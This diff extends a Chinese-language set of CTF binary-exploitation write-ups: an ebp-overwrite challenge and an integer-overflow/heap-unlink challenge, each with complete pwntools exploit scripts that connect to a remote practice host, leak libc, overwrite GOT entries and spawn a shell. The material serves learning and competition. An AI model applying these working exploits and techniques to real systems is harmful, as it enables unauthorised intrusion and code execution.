@@ -1992,7 +1992,7 @@ if __name__ == '__main__':
 
 思路：漏洞点为常规的栈溢出，难点在于绕过地址随机化，一是利用了栈上残留的system变量，二是利用了vsyscall地址不随机的缺陷，三是利用one_gadget.
 
-题目的溢出点比较常规，没有开启canary等保护机制，但是开启了PIE，由于地址都是随机的，没法直接ROP。本题存在一个特殊的栈变量，hint函数会将system函数的地址放入到栈中ebp+0x110处，而在go函数中这个位置正好存放一个变量，而且这里存在一个漏洞就是输入的level值小于等于0时，这个变量没有赋初值，默认为system的地址，此外在输入any more的时候这个变量会加上一个值，如果这个值为one_gadget和system函数在libc的偏移，那么这个变量中实际的保存的值将会变为one_gadget在内存中的真实地址！
+题目的溢出点比较常规，没有开启canary等保护机制，但是开启了PIE，由于地址都是随机的，没法直接ROP。本题存在一个特殊的栈变量，hint函数会将system函数的地址放入到栈中ebp+0x110处，而在go函数中这个位置正好存放一个变量，而且这里存在一个漏洞就是输入的level值小于等于0时，这个变量没有赋初值，默认为system的地址，此外在输入any more的时候这个变量会加上一个值，如果这个值为one_gadget和system函数在libc的偏移，那么这个变量中实际的保存的值将会变为one_gadget在内存中的真实地址！这个漏洞需要仔细检查反汇编代码，直接看反编译结果是看不出来的！！！
 
 现在只通过栈溢出将这个值作为返回地址就可以了，但是这个变量的位置在实际返回地址下方24字节，这里可以使用类似nop滑行指令的方式，将溢出函数的返回值指向一个ret指令，这时溢出函数返回时会执行ret，即弹出一个地址，然后继续返回。这个ret指令来自vsyscall段，这个段的地址空间是固定的而不是随机的（某些版本的linux将这个段删除了），因此可以从这里找一个ret指令即可。
 
@@ -2037,5 +2037,337 @@ if __name__ == '__main__':
     # 覆盖到rbp，然后从返回地址开始覆盖了3个ret指令的地址，执行完3个ret后会跳转到one_gadget
     data = io.sendafter('Answer:', b'a' * 0x38 + p64(vsyscall) * 3)
     print(data)
+    io.interactive()
+```
+
+### 24. format2
+题目：暂无
+
+思路：通过栈溢出覆盖ebp从而劫持控制流。
+
+存在漏洞的函数是auth，memcpy将base64解码后的数据（最长为12字节）复制到临时变量（大小为8字节），会导致栈溢出，但是由于长度限制只能覆盖到ebp。另外，通过checksec查看存在canary保护，但是查看auth的汇编代码发现并没有，这主要是因为这个程序使用了静态编译，库函数开启了canary机制导致checksec的分析受到了干扰。
+
+#### 通过ebp控制程序流的原理
+一般退出函数都是执行一下两条指令
+```
+leave
+ret
+# 等效于
+mov esp, ebp
+pop ebp
+ret
+```
+内层函数退出时，如果可以覆盖栈帧中的ebp（恶意值为X）。
+1. 内层函数退出时: esp = ebp，ebp = X.
+2. 外层函数退出时: esp = X, ebp = [X], ret = [X+4]，从而控制了返回地址
+
+全部源代码如下：
+```python
+from pwn import *
+import base64
+
+debug = False
+if debug:
+    io = process('./a')
+else:
+    io = remote('220.249.52.134', 56892)
+
+shell_addr = 0x08049284
+input_addr = 0x0811EB40
+
+if __name__ == '__main__':
+    # 覆盖ebp为input_addr - 4
+    # input_addr前4个字节为getshell的地址
+    # ret = [X+4] = [input_addr - 4 + 4] = [input_addr] = getshell_addr
+    payload = p32(shell_addr) + b'xxxx' + p32(input_addr - 4)
+    payload = base64.b64encode(payload)
+    io.sendlineafter(': ', payload)
+
+    io.interactive()
+```
+
+### 25. 4-ReeHY-main-100
+题目：暂无
+
+思路：通过整数溢出进而进行栈溢出；堆溢出。
+
+#### 整数溢出
+```c++
+int sub_4009D1()
+{
+  int result; // eax
+  char buf; // [rsp+0h] [rbp-90h]
+  void *dest; // [rsp+80h] [rbp-10h]
+  int v3; // [rsp+88h] [rbp-8h]
+  size_t nbytes; // [rsp+8Ch] [rbp-4h]
+
+  result = dword_6020AC;
+  if ( dword_6020AC <= 4 )
+  {
+    puts("Input size");
+    result = sub_400C55("Input size");
+    LODWORD(nbytes) = result;
+    if ( result <= 4096 )
+    {
+      puts("Input cun");
+      result = sub_400C55("Input cun");
+      v3 = result;
+      if ( result <= 4 )
+      {
+        dest = malloc((signed int)nbytes);
+        puts("Input content");
+        // 比较大小用的是有符号数，读取数据用的是无符号数
+        // 如果nbytes为-1，将会进入下面的分析，read再执行时会造成buf溢出
+        if ( (signed int)nbytes > 112 )
+        {
+          read(0, dest, (unsigned int)nbytes);
+        }
+        else
+        {
+          read(0, &buf, (unsigned int)nbytes);
+          memcpy(dest, &buf, (signed int)nbytes);
+        }
+        *(_DWORD *)(qword_6020C0 + 4LL * v3) = nbytes;
+        *((_QWORD *)&unk_6020E0 + 2 * v3) = dest;
+        dword_6020E8[4 * v3] = 1;
+        ++dword_6020AC;
+        result = fflush(stdout);
+      }
+    }
+  }
+  return result;
+}
+```
+
+全部利用代码如下：
+```python
+from pwn import *
+from LibcSearcher import *
+
+context.arch = 'amd64'
+elf = ELF('./4-ReeHY-main')
+libc = ELF('./ctflibc.so.6')
+
+main_addr = 0x400C8C
+pop_rdi = 0x400da3
+# 通过题目给的libc搜索到的one_gadget没法用，可能不是正确的libc
+# 而是通过libsearcher找到数据库中对应的so文件，然后再使用one_gadget搜索得到正确的地址
+one_gadget = 0x45216
+
+debug = False
+if debug:
+    io = process('./4-ReeHY-main')
+else:
+    io = remote('220.249.52.134', 43553)
+
+def create(index, size, content):
+    data = io.sendlineafter('$ ', '1')
+    print(data)
+    data = io.sendlineafter('\n', '%d' % size)
+    print(data)
+    data = io.sendlineafter('\n', '%d' % index)
+    print(data)
+    data = io.sendlineafter('\n', content)
+    print(data)
+
+if __name__ == '__main__':
+    io.sendlineafter('$ ', '1')
+    payload = b'\x00' * 0x90 + b'A' * 8 + p64(pop_rdi) + p64(elf.got['puts']) + \
+            p64(elf.plt['puts']) + p64(main_addr)
+    create(1, -1, payload)
+    put_addr = u64(io.recv(6).ljust(8, b'\x00'))
+    log.success('put address: 0x%x' % put_addr)
+    log.info('puts: 0x%x' % libc.sym['puts'])
+    libc = LibcSearcher('puts', put_addr)
+    log.info('puts: 0x%x' % libc.dump('puts'))
+    libc_base = put_addr - libc.dump('puts')
+    system_addr = libc_base + libc.dump('system')
+    binsh_addr = libc_base + libc.dump('str_bin_sh')
+
+    io.sendlineafter('$ ', '1')
+    # 可以使用system("/bin/sh")或者one_gadget的方式获取shell
+    payload = b'\x00' * 0x98 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
+    payload = b'\x00' * 0x98 + p64(one_gadget + libc_base) + b'\x00'*0x100
+    create(1, -1, payload)
+    io.interactive()
+```
+
+#### unlink漏洞
+这个题目的另一解法是利用堆块释放时unlink操作实现任意地址写入，利用的前提是可以修改堆块头部，由于在写入堆块前会检查长度，没法直接堆溢出，但是程序在删除堆块的时候使用有符号数，没有考虑负数的情况，因此可以释放掉保存堆块长度的chunk，利用fastbin的特性可以重新申请回来，然后就可以修改堆场长度进行堆溢出了。
+```c++
+__int64 sub_400B21()
+{
+  __int64 result; // rax
+  int v1; // [rsp+Ch] [rbp-4h]
+
+  puts("Chose one to dele");
+  result = sub_400C55("Chose one to dele");
+  v1 = result;
+  if ( (signed int)result <= 4 )
+  {
+    free(*((void **)&unk_6020E0 + 2 * (signed int)result));
+    dword_6020E8[4 * v1] = 0;
+    puts("dele success!");
+    result = (unsigned int)(dword_6020AC-- - 1);
+  }
+  return result;
+}
+```
+
+首先需要绕过unlink时的检测操作。
+```python
+# 假设原始堆块为P
+P-> prev_size
+    size
+    data
+#全部变量X中保存P->data
+
+# 在堆块内构造一个伪造的空闲堆块，并覆盖下一个堆块的头
+P-> prev_size
+    size
+fake_P->fake_pre_size: 0
+        fake_size: size - 0x10
+        fake_fd
+        fake_bk
+```
+
+释放下一个堆块时，发现上面响铃的伪造空闲堆块fake_P，于是发生合并,合并前会检测:
+```python
+fake_P->fake_fd->bk == fake_P
+fake_P->fake_bk->fd == fake_P
+```
+
+这就需要构造fake_fd和fake_bk, 使得
+```python
+*(fake_fd+0x18) = *(fake_bk+0x10) = fake_P = P->data = *X
+即fake_fd+0x18 = fake_bk+0x10 = X
+fake_fd = X - 0x18, fake_bk = X - 0x10
+```
+在本题中，如果使用第0个堆块作为unlink对象，那么X对应bss段的地址为0x6020E0，因此
+```python
+fake_fd = 0x6020E0 - 0x18 = 0x6020C8
+fake_bk = 0x6020E0 - 0x10 = 0x6020D0
+```
+
+unlink操作实现任意地址写入。unlink操作实际上就是双链表删除节点的操作
+```python
+# 当前节点为P
+# 找到前后两个节点
+FD = P->fd
+BK = P->bk
+# 修改前面节点的后向指针
+FD->bk = BK
+# 修改后面节点的前向指针
+BK->fd = FD
+```
+对应到伪造的节点，unlink执行了下面的操作
+```python
+FD = fake_P->fd = 0x6020C8
+BK = fake_P->bk = 0x6020D0
+FD->bk = *(0x6020E0) = 0x6020D0
+BK->fd = *(0x6020E0) = 0x6020C8
+```
+最终本来写入第0个堆块地址的变量X被写入了一个X前面的bss段地址，这时候写入第0个堆块实际上就是修改bss段的数据了，进一步修改第0个堆块地址为某个函数的got地址，再写入第0个堆块就是修改got表的内容了，从而实现任意地址写入。
+
+全部利用源代码如下：
+```python
+from pwn import *
+from LibcSearcher import *
+
+context.arch = 'amd64'
+elf = ELF('./4-ReeHY-main')
+libc = ELF('./ctflibc.so.6')
+
+debug = False
+if debug:
+    io = process('./4-ReeHY-main')
+else:
+    io = remote('220.249.52.134', 43553)
+
+def create(index, size, content):
+    data = io.sendlineafter('$ ', '1')
+    print(data)
+    data = io.sendlineafter('\n', '%d' % size)
+    print(data)
+    data = io.sendlineafter('\n', '%d' % index)
+    print(data)
+    data = io.sendafter('\n', content)
+    print(data)
+
+def edit(index, content):
+    data = io.sendlineafter('$ ', '3')
+    print(data)
+    data = io.sendlineafter('\n', '%d' % index)
+    print(data)
+    data = io.sendafter('\n', content)
+    print(data)
+
+def delete(index):
+    data = io.sendlineafter('$ ', '2')
+    print(data)
+    data = io.sendlineafter('\n', '%d' % index)
+    print(data)
+
+chunk0_ptr = 0x6020e0
+
+if __name__ == '__main__':
+    io.sendlineafter('$ ', '1')
+    # create two chunk for merge
+    create(0, 0x100, '1')
+    create(1, 0x100, '1')
+    # delete byteArr chunk
+    delete(-2)
+    # gdb.attach(io)
+    # pause()
+    # using fastbin to get last chunk
+    # set chunk0 chunk1 size
+    payload = p32(0x200) + p32(0x200)
+    create(2, 0x10, payload)
+    # overflow chunk0
+    # 1. prev_size size
+    payload = p64(0) + p64(0x101)
+    # 2. fd bk
+    payload += p64(chunk0_ptr - 0x18) + p64(chunk0_ptr - 0x10)
+    # 3. padding
+    payload += b'\x00' * (0x100 - 0x20)
+    # 4. next prev_size next size
+    payload += p64(0x100) + p64(0x110)
+    edit(0, payload)
+    # gdb.attach(io)
+    # pause()
+    # delete chunk1 will trigger chunk merge
+    delete(1)
+    # gdb.attach(io)
+    # pause()
+    # now *chunk0_ptr = 0x6020c8
+    # edit chunkArr
+    payload = b'A' * 0x18
+    payload += p64(elf.got['free']) + p64(1)
+    payload += p64(elf.got['puts']) + p64(1)
+    payload += p64(elf.got['atoi']) + p64(1)
+    edit(0, payload)
+    # gdb.attach(io)
+    # pause()
+    # now *chunk0_ptr = elf.got['free']
+    # *chunk1_ptr = elf.got['puts']
+    # hijack free with puts
+    payload = p64(elf.plt['puts'])
+    edit(0, payload)
+    # gdb.attach(io)
+    # pause()
+    # call free(chunk1) => puts(elf.got['puts'])
+    delete(1)
+    # gdb.attach(io)
+    # pause()
+    data = io.recv(6)
+    print(data)
+    puts_addr = u64(data.ljust(8, b'\x00'))
+    libc = LibcSearcher('puts', puts_addr)
+    log.info('puts: 0x%x' % libc.dump('puts'))
+    libc_base = puts_addr - libc.dump('puts')
+    system_addr = libc_base + libc.dump('system')
+    # hijack atoi with system
+    edit(2, p64(system_addr))
+    io.sendlineafter('$ ', '/bin/sh')
     io.interactive()
 ```
